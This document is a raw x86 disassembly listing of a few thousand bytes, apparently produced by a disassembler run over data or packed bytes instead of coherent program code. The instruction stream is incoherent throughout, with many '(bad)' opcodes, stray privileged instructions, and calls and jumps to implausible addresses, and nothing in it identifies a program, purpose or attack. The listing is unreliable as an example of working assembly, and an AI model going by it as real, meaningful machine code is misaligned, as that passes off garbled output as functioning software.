  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
